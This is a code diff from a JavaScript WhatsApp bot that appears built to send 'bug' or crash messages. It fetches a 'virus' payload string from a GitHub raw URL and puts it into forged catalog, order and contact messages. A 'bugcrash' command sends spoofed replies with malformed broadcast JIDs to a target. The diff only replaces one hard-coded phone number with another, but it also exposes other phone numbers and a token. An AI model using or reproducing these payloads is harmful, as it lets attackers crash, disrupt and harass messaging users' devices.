@@ -78,7 +78,7 @@ let viruswan = await (await fetch("https://raw.githubusercontent.com/WannBotz/vi
 			"surface": "CATALOG",
 			"message": "",
 			"orderTitle": `${gcname}`,
-			"sellerJid": "6281265970249@s.whatsapp.net",
+			"sellerJid": "6281321776496@s.whatsapp.net",
 			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 			"totalAmount1000": fsizedoc,
 			"totalCurrencyCode": "IDR" 
@@ -107,7 +107,7 @@ let viruswan = await (await fetch("https://raw.githubusercontent.com/WannBotz/vi
 			"surface": "CATALOG",
 			"message": `${gcname}`,
 			"orderTitle": `${gcname}`,
-			"sellerJid": "6281265970249@s.whatsapp.net",
+			"sellerJid": "6281321776496@s.whatsapp.net",
 			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 			"totalAmount1000": fsizedoc,
 			"totalCurrencyCode": "IDR"
@@ -163,14 +163,14 @@ let viruswan = await (await fetch("https://raw.githubusercontent.com/WannBotz/vi
 			"firstImageId": 1,
 			"salePriceAmount1000": fsizedoc,
 			"retailerId": `${gcname}`,
-			"url": "wa.me/6281265970249"
+			"url": "wa.me/6281321776496"
 		},
-			"businessOwnerJid": "6281265970249@s.whatsapp.net",
+			"businessOwnerJid": "6281321776496@s.whatsapp.net",
 		}
 	}), { userJid: m.chat, quoted: ftrolii })	
 	//=================================================//	
 	//# Contact
-	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${gcname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${gcname}\nitem1.TEL;waid=6281265970249:6281265970249\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
+	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${gcname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${gcname}\nitem1.TEL;waid=6281321776496:6281321776496\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
 	//=================================================//   
 	//# Text
 	const main = {
@@ -210,8 +210,8 @@ let viruswan = await (await fetch("https://raw.githubusercontent.com/WannBotz/vi
 		}
 		break
 		case 'bugcrash': {
-			conn.fakeReply(target, 'A', '6281265970249@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
-			conn.fakeReply(target, 'A', '6281265970249@s.whatsapp.net', 'B', '0@broadcast')
+			conn.fakeReply(target, 'A', '6281321776496@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
+			conn.fakeReply(target, 'A', '6281321776496@s.whatsapp.net', 'B', '0@broadcast')
 			conn.fakeReply(target, 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
 			conn.fakeReply(target, 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
 			conn.fakeReply(target, 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
